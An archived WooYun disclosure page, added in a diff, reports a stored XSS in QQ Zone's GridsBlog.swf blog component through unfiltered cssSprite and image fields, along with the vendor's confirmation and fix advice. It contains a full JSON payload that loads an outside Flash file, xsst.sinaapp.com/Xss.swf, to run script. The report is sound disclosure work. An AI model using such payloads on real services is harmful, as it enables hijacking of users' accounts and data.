@@ -1,0 +1,260 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		QQ空间某功能缺陷导致日志存储型XSS - 10  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		QQ空间某功能缺陷导致日志存储型XSS - 10  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/gainover">gainover</a> 
+</li><li>提交时间：		2013-03-26 08:51</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-03-26：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-03-26：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-04-05：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-04-15：	细节向普通白帽子公开<br/>
+									2013-04-25：	细节向实习白帽子公开<br/>
+									2013-05-10：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">话说微博上看过一故事，某人辛辛苦苦装修了房子，最后发现装修的是别人的房子。 修复漏洞有时候也是这样，出力出在了不该出的位置，辛辛苦苦修复的很好，最后其实修的不是正位置啊～</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1. 接着系列8，我们继续阅读/qzone/newblog/v5/flash/GridsBlog.swf的代码。<br />
+<br />
+<br />
+<br />
+接着上一次的BackGroundNavi下方不远处，我们可以可以看到 new Grids这段，userData(即我们的json数据)进入了Grids类，如下图：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/260055487f1a5a7ca234c97b513c6878a428ed82.jpg" target="_blank"><img src="../images/260055487f1a5a7ca234c97b513c6878a428ed82.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+2. 我们跟踪Grids类。搜索 Class Grids<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/26005558a278be15e792cde70001cbb6882959d2.jpg" target="_blank"><img src="../images/26005558a278be15e792cde70001cbb6882959d2.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+数据进入了_dataObject后，跳入 initView<br />
+<br />
+<br />
+<br />
+3. 在进入initView后，不远处，我们可以看到下面这样一段代码。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/26005608d695bc5c4b41ef3d9d6175f324c13de1.jpg" target="_blank"><img src="../images/26005608d695bc5c4b41ef3d9d6175f324c13de1.jpg" alt="3.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+this._dataObject.cssSprite... 这个在我们提交的JSON数据里，并没有看到过 cssSprite 这个属性名。看来是某特定功能会用到的属性，读代码的好处这里就可以看出来了，如果是黑盒，是不可能测试到cssSprite这种属性的。<br />
+<br />
+<br />
+<br />
+并且，这个cssSprite直接就进入了 load函数。<br />
+<br />
+<br />
+<br />
+赤裸裸的漏洞么～～ <br />
+<br />
+<br />
+<br />
+4. 因此，我们可以修改魔方日志所提交的数据。加上一个cssSprite属性。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/26005618838e812c356da7ed9cf025aabea257cb.jpg" target="_blank"><img src="../images/26005618838e812c356da7ed9cf025aabea257cb.jpg" alt="4.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+可以看到成功执行XSS。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/26005630b7a5c389b9ea5422f6acb32302a249d5.jpg" target="_blank"><img src="../images/26005630b7a5c389b9ea5422f6acb32302a249d5.jpg" alt="5.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+5. 开发人员已经针对系列 8中 bgURL做了完整的修复措施。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/260056396189b6a5d2882c7996b272a76077b516.jpg" target="_blank"><img src="../images/260056396189b6a5d2882c7996b272a76077b516.jpg" alt="6.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+我猜，如果我这个漏洞在此处结束，开发人员可能会采用上面的代码，将cssSprite也过滤一次。<br />
+<br />
+<br />
+<br />
+就bgURL而言，这个修复是没问题的。但是这样有一点“治标不治本”的感觉，实际上在这个GridsBlog.swf中，load外部资源之前似乎都没有做过滤，所以个人觉得，应该做出修改的是FLASH文件，而不是在JS中一一过滤（吃力不讨好啊），否则就会继续出现本文中的问题。<br />
+<br />
+<br />
+<br />
+6. 比如说吧： 其实下面这样也是可以的，将数据里的gXX.content.image 设置为外部FLASH一样可以导致XSS。<br />
+<br />
+<br />
+<br />
+</p><pre><code>{&quot;g1&quot;:{&quot;visible&quot;:1,&quot;id&quot;:1,&quot;content&quot;:{&quot;mood&quot;:&quot;&quot;,&quot;image&quot;:&quot;&quot;,&quot;date&quot;:&quot;&quot;,&quot;text&quot;:&quot;1&quot;},&quot;type&quot;:1,&quot;title&quot;:&quot;???С???????&quot;},&quot;g0&quot;:{&quot;visible&quot;:1,&quot;id&quot;:0,&quot;content&quot;:{&quot;mood&quot;:&quot;&quot;,&quot;image&quot;:&quot;&quot;,&quot;date&quot;:&quot;&quot;,&quot;text&quot;:&quot;1&quot;},&quot;type&quot;:1,&quot;title&quot;:&quot;???????????&quot;},&quot;g8&quot;:{&quot;visible&quot;:1,&quot;id&quot;:8,&quot;content&quot;:{&quot;mood&quot;:&quot;&quot;,&quot;image&quot;:&quot;&quot;,&quot;date&quot;:&quot;&quot;,&quot;text&quot;:&quot;1&quot;},&quot;type&quot;:1,&quot;title&quot;:&quot;????????2012??&quot;},&quot;g2&quot;:{&quot;visible&quot;:1,&quot;id&quot;:2,&quot;content&quot;:{&quot;mood&quot;:&quot;&quot;,&quot;image&quot;:&quot;&quot;,&quot;date&quot;:&quot;&quot;,&quot;text&quot;:&quot;1&quot;},&quot;type&quot;:1,&quot;title&quot;:&quot;???????&quot;},&quot;g6&quot;:{&quot;visible&quot;:1,&quot;id&quot;:6,&quot;content&quot;:{&quot;mood&quot;:&quot;&quot;,&quot;image&quot;:&quot;&quot;,&quot;date&quot;:&quot;&quot;,&quot;text&quot;:&quot;1&quot;},&quot;type&quot;:1,&quot;title&quot;:&quot;????????&quot;},&quot;templateName&quot;:&quot;??????&quot;,&quot;g7&quot;:{&quot;visible&quot;:1,&quot;id&quot;:7,&quot;content&quot;:{&quot;mood&quot;:&quot;&quot;,&quot;image&quot;:&quot;&quot;,&quot;date&quot;:&quot;&quot;,&quot;text&quot;:&quot;1&quot;},&quot;type&quot;:1,&quot;title&quot;:&quot;???????&quot;},&quot;g4&quot;:{&quot;visible&quot;:1,&quot;id&quot;:4,&quot;content&quot;:{&quot;mood&quot;:&quot;&quot;,&quot;image&quot;:&quot;&quot;,&quot;date&quot;:&quot;2013-03-26&amp;1&quot;,&quot;text&quot;:&quot;&quot;},&quot;type&quot;:0,&quot;title&quot;:&quot;???? 2013-3-26&quot;},&quot;g3&quot;:{&quot;visible&quot;:1,&quot;id&quot;:3,&quot;content&quot;:{&quot;mood&quot;:&quot;&quot;,&quot;image&quot;:&quot;&quot;,&quot;date&quot;:&quot;&quot;,&quot;text&quot;:&quot;1&quot;},&quot;type&quot;:1,&quot;title&quot;:&quot;????????&quot;},&quot;version&quot;:&quot;1.2&quot;,&quot;g5&quot;:{&quot;visible&quot;:1,&quot;id&quot;:5,&quot;content&quot;:{&quot;mood&quot;:&quot;&quot;,&quot;image&quot;:&quot;http://xsst.sinaapp.com/Xss.swf&quot;,&quot;date&quot;:&quot;&quot;,&quot;text&quot;:&quot;&quot;},&quot;type&quot;:2,&quot;title&quot;:&quot;??????????&quot;},&quot;tempId&quot;:47,&quot;bgItem&quot;:{&quot;bgId&quot;:&quot;87&quot;,&quot;bgURL&quot;:&quot;/qzone/newblog/v5/flashassets/bg87.swf?bgver=1.0&amp;max_age=31104000&quot;,&quot;gridcolor&quot;:&quot;0xFF3300&quot;,&quot;alpha&quot;:1,&quot;align&quot;:&quot;right&quot;,&quot;wordcolor&quot;:&quot;0xCC0000&quot;}}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+见弹窗<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/2600581781ff307fc6126d2a8f06daf84eb1635b.jpg" target="_blank"><img src="../images/2600581781ff307fc6126d2a8f06daf84eb1635b.jpg" alt="7.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+后面也不想再刷一次这个GridsBlog.swf，建议你们的开发人员将FLASH里会load外部资源的位置，都先check下，再load。<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">见详细说明 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">修复FLASH，不要在JS里修拉～ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/gainover" title="gainover">gainover</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-020674" title="QQ空间某功能缺陷导致日志存储型XSS - 10">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2013-03-26 11:36</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢，已在处理中！</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="20674";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
